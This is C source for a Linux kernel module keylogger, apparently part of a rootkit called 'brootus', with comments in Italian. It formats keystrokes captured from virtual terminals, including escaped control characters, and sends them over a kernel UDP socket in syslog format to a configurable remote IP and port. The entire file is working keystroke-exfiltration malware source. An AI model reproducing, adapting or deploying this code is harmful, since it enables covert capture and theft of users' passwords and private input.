#include <linux/netdevice.h>
#include <linux/in.h>

#include "kernel_variables.h"
#include "keylogger.h"

#define SYSLOG_PORT 514

// paramentri del syslog server ip
char* syslog_ip = "192.168.56.1";
unsigned short syslog_port = SYSLOG_PORT;

module_param(syslog_ip, charp, 0);
MODULE_PARM_DESC(syslog_ip, "IP of the syslog server");

module_param(syslog_port, ushort, 0);
MODULE_PARM_DESC(syslog_port, "Syslog port");

int enabled = 1;

struct socket* syslog_sock = NULL;
struct sockaddr_in syslog_addr;

unsigned short syslog_port_bin;
unsigned int syslog_ip_bin;
char* msg_template = "<12>1 - - brootus - - - ";

// funzione che mette una stringa che punta a una variabile src in un buffer (assunto grande)
// ritorna il numero di caratteri scritti nel buffer -> al max 4
int put_character(char* dest, char* src)
{
  // Printable characters
  if (*src >= ' ' && *src <= '~') {
    *dest = *src;
    return 1;
  }
  // a capo e spazio
  if (*src == '\n') {
    return sprintf(dest, "\\n");
  }
 
  if (*src == '\r') {
    return sprintf(dest, "\\r");
  }
  // Tab
  if (*src == '\t') {
    return sprintf(dest, "\\t");
  }
  // tutti gli altri caratteri sono riportati in hex
  return sprintf(dest, "\\x%x", (unsigned char) *src);
}

void log_keys(char* vt_name, char* keys, int len)
{
  mm_segment_t oldfs;
  struct msghdr msg;
  struct iovec iov;
  int msg_template_len = strlen(msg_template);
  int vt_name_len = strlen(vt_name);
  int payload_max_len = msg_template_len + vt_name_len + (len * 4) + 3;
  int payload_len = 0;
  char* payload;
  int i;

  // controlla se si può runnare
  if (!enabled || syslog_sock == NULL) {
    return;
  }

  // alloca spazio per il payload
  payload = (char*) kmalloc(payload_max_len + 1, GFP_KERNEL);

  // composizione messaggio
  sprintf(payload, "%s[%s] ", msg_template, vt_name);
  payload_len += msg_template_len + vt_name_len + 3;
  // strncat(payload, keys, len);
  // mostra caratteri speciali
  for (i = 0; i < len; i++) {
    payload_len += put_character(payload + payload_len, keys + i);
  }

  // costruzione vettore IO
  iov.iov_base = payload;
  iov.iov_len = payload_len;

  // costruisce messaggio dell'header
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  // si switcha al kernel fs
  oldfs = get_fs();
  set_fs(KERNEL_DS);

  // invio pacchetto
  // printk(KERN_ALERT "Sending payload: [%d] %s\n", strlen(payload), payload);
  sock_sendmsg(syslog_sock, &msg, payload_len);
  // printk(KERN_ALERT "err: %d\n", err);

  // riswicha al precedente fs
  set_fs(oldfs);

  kfree(payload);
}

void init_socket(void)
{
  // crea la socket
  int err = sock_create_kern(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &syslog_sock);
  if (err) {
    // indica che non è presente una socket già creata
    syslog_sock = NULL;
    return;
  }
}

void connect_socket(void)
{
  int err;

  if (syslog_sock != NULL) {
    sock_release(syslog_sock);
  }
  init_socket();

  if (syslog_sock == NULL) {
    return;
  }

  // crea un endpoint
  syslog_addr.sin_family = AF_INET;
  // syslog_addr.sin_addr.s_addr = htonl(0xc0a83801);
  syslog_addr.sin_addr.s_addr = syslog_ip_bin;
  syslog_addr.sin_port = htons(syslog_port_bin);

  err = syslog_sock->ops->connect(syslog_sock, (struct sockaddr*) &syslog_addr, sizeof(struct sockaddr), 0);
  if (err) {
    // problema alla socket
    syslog_sock = NULL;
    return;
  }
}

void set_syslog_ip(char* ip_str)
{
  int err;
  u8 ip[4];
  const char* end;

  // analizza indirizzo ip
  err = in4_pton(ip_str, -1, ip, -1, &end);
  if (err == 0) {
    return;
  }
  // aggiorna la rappresentazione binaria dell'ip
  syslog_ip_bin = *((unsigned int*) ip);
  connect_socket();
}

void set_syslog_port(unsigned short port) {
  syslog_port_bin = port;
  connect_socket();
}

void enable_keylogger(void)
{
  enabled = 1;
}

void disable_keylogger(void)
{
  enabled = 0;
}

void init_keylogger(void)
{
  // imposta le porte del syslog
  syslog_port_bin = syslog_port;

  //imposta l'ip precedentemente creato
  set_syslog_ip(syslog_ip);

  enable_keylogger();
}

void finalize_keylogger(void)
{
  sock_release(syslog_sock);
  disable_keylogger();
}